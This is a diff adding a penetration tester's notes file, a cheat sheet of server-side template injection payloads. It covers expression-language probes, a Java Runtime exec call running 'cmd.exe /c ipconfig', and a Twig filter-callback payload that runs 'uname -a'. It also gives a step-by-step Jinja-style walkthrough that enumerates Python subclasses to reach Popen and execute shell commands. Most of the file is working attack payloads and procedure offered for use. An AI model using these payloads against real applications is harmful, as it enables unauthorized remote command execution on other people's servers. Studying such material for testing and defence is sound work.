@@ -1,0 +1,60 @@
+Server-Side Template Injection:
+	${7*7}  -> Returns 49
+	${param}
+	${header}
+	${cookie}
+	${root}
+	${_root}
+	${self}
+	${_self}
+
+	${facesContext.getExternalContext().getResponse().setContentType("text/plain;charset=\"UTF-7\"")}
+		Does this change the content-type header to UTF7
+
+	${(java.lang.Runtime).getRuntime().exec(“cmd.exe /c ipconfig”)}
+
+	${param.Note.replaceAll(“P”,“Q”)}
+		Note would be the name of another parameter in the request
+		Put PPPP in the Note parameter and see if it gets replaced with Q
+
+	Example shell with EL template: http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html
+
+
+
+     Example 1:
+	https://site.com/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname%20-a')}}
+		returns uname -a output
+
+	
+     Example Walk Through 2:
+
+	http://site.com/{{2*2}}
+		returns 4 in the response
+
+	http://site.com/{{''.__class__.mro()[X].__subclasses__()}}
+		Where X is the integers I need to find
+		Start with 0 for X and increment X until you get a list of subclasses
+		{{''.__class__.mro()[1].__subclasses__()}}
+		{{''.__class__.mro()[2].__subclasses__()}}
+			returns: a list of all python classes in use. Search for popen, etc.
+			Page not Found: http://ptl-a17c254a-1e59253c.libcurl.st/[<type 'type'>, <type 'weakref'>, <type 
+			'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, 
+			<type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, 
+			<type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, 
+			<type 'complex'>, <type 'float'>, <type 'buffer'>, <ty......
+
+		copy output and put into VI or SED and replace all > with a \r (CRLF) to put each class on it's own line
+		 	in VI: :%s />/\r/g
+		then number each line
+			in VI: :set number
+		find Popen line number
+			in VI: :/Popen
+
+		try calling the Popen class by it's number on send through intruder until you find the Popen subclass:
+
+	http://site.com/{{''.__class__.mro()[2].__subclasses__()[233]}}
+		VI starts counting at 1 instead of 0 so your number may be off a bit
+		should see a successful request
+
+	http://site.com/{{''.__class__.mro()[2].__subclasses__()[233]("uname -a",shell=True,stdout=-1).communicate()[0]}}
+		should have command execution and see the output of uname -a
